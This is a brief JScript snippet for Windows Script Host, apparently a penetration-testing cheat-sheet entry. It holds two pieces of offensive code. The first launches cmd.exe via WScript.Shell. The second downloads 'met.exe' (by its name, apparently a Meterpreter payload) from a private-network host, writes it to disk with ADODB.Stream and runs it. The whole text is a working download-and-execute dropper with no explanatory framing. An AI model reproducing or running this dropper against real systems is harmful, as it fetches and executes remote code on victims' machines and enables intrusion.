# run command
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");

# download and execute file

var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();
if (Object.Status == 200){
var Stream = WScript.CreateObject('ADODB.Stream');
	Stream.Open();
	Stream.Type = 1;
	Stream.Write(Object.ResponseBody);
	Stream.Position = 0;
	Stream.SaveToFile("met.exe", 2);
	Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("met.exe");
